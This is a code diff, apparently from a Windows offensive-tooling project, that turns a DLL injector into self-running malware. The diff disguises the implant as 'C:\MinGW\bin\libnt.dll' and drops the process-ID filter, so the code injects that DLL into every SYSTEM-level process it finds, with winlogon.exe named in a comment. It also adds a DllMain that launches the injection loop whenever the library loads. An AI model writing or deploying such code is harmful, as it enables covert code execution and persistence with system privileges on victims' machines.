@@ -5,7 +5,8 @@
 #include "injector.hpp"
 
 //PCWSTR dllPath = L"C:\\Users\\speep\\Source\\repos\\408T_implant\\x64\\Release\\implant.dll";
-PCWSTR dllPath = L"C:\\Windows\\Temp\\implant.dll";
+//PCWSTR dllPath = L"C:\\Users\\speep\\source\\repos\\Haera\\NTCrawler\\x64\\Release\\implant.dll";
+PCWSTR dllPath = L"C:\\MinGW\\bin\\libnt.dll";
 
 int main(int argc, char *argv[])
 {
@@ -33,20 +34,56 @@ int main(int argc, char *argv[])
                 wcstombs_s(&dude, username, sizeof(username), procInfo.username.c_str(), _TRUNCATE);
 
                 if ((procInfo.flags & (INTEGRITY_SYSTEM | USER_SYSTEM)) == GOAT_STATUS)
-                    info("[%lu]: %s %s %s, %d", procEntry.th32ProcessID, procName, username, integrityLevel, procInfo.flags);
-
-                //if (!strcmp(procName, "notepad.exe")) {
-                if (procEntry.th32ProcessID == atoi(argv[1]))
                 {
-                    std::wstring fmtParams = std::wstring(procEntry.szExeFile) + L" " 
-                                           + procInfo.integrityLevel + L" " 
-                                           + procInfo.username;
-                    injector::InjectDLL(procEntry.th32ProcessID, dllPath, NULL);
-                                                                        // LOL
+                    info("[%lu]: %s %s %s, %d", procEntry.th32ProcessID, procName, username, integrityLevel, procInfo.flags);
+                    //if (procEntry.th32ProcessID == atoi(argv[1]))
+                    //if (strcmp(procName, "winlogon.exe") == 0)
+                    {
+                        /*std::wstring fmtParams = std::wstring(p?rocEntry.szExeFile) + L" "
+                            + procInfo.integrityLevel + L" "
+                            + procInfo.username; */                            
+                        injector::InjectDLL(procEntry.th32ProcessID, dllPath, NULL);
+                                                                            // LOL
+                        Sleep(1000);
+                    }
                 }
             }
         } while (Process32Next(hSnap, &procEntry));
     }
     CloseHandle(hSnap);
     return 0;
+}
+
+DWORD APIENTRY OnDllAttach(PVOID pThreadParameter) {
+    main(0, NULL);
+
+    return 0;
+}
+
+DWORD WINAPI OnDllDetach(LPVOID lpParameter)
+{
+    FreeLibraryAndExitThread((HMODULE)lpParameter, EXIT_SUCCESS);
+
+    return 0;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+    DWORD  dwReason,
+    LPVOID lpReserved
+)
+{
+    if (dwReason == DLL_PROCESS_ATTACH)
+    {
+        // disable DLL_THREAD_ATTACH and DLL_THREAD_DETACH reasons to call
+        DisableThreadLibraryCalls(hModule);
+
+        // create main thread
+        CreateThread(nullptr, 0U, OnDllAttach, hModule, 0UL, nullptr);
+    }
+    else if (dwReason == DLL_PROCESS_DETACH)
+    {
+        //if (lpReserved == nullptr)
+        return OnDllDetach(lpReserved);
+    }
+    return true;
 }
